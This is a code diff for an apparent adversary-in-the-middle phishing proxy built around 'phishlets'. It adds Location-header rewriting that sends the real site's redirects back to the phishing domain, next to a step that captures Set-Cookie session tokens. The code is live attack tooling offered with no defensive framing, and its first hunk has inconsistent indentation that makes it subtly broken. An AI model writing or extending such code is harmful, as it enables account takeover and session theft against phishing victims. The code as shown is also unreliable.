@@ -81,7 +81,17 @@ class VantaInterceptor:
         # (Simplified matching logic for V5 MVP)
         for phish_sub, target_host in target_map.items():
             if phish_sub in host:
-                flow.request.host = target_host
+                 flow.request.host = target_host
+                 try:
+                     if not hasattr(flow, "metadata"):
+                         flow.metadata = {}
+                 except Exception:
+                     pass
+                 try:
+                     flow.metadata["v_ph_host"] = host
+                     flow.metadata["v_tgt_host"] = target_host
+                 except Exception:
+                     pass
                 self.logger.debug(f"Rewrote host: {host} -> {target_host}")
                 break
         
@@ -127,10 +137,21 @@ class VantaInterceptor:
         """
         # 1. Rewrite Location headers
         if "Location" in flow.response.headers:
-            loc = flow.response.headers["Location"]
-            # TODO: Reverse map target -> phishing domain
-            # flow.response.headers["Location"] = ...
-            pass
+            try:
+                loc = flow.response.headers["Location"]
+                ph_host = getattr(flow, "metadata", {}).get("v_ph_host")
+                tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
+                if ph_host and loc:
+                    from urllib.parse import urlsplit, urlunsplit
+                    sp = urlsplit(loc)
+                    new_netloc = sp.netloc
+                    targets = [m.target for m in getattr(self.phishlet, "proxy_hosts", [])]
+                    if sp.netloc in targets or (tgt_host and sp.netloc == tgt_host):
+                        new_netloc = ph_host
+                    new_loc = urlunsplit((sp.scheme, new_netloc, sp.path, sp.query, sp.fragment))
+                    flow.response.headers["Location"] = new_loc
+            except Exception:
+                pass
 
         # 2. Capture Set-Cookie
         self._scan_for_tokens(flow)
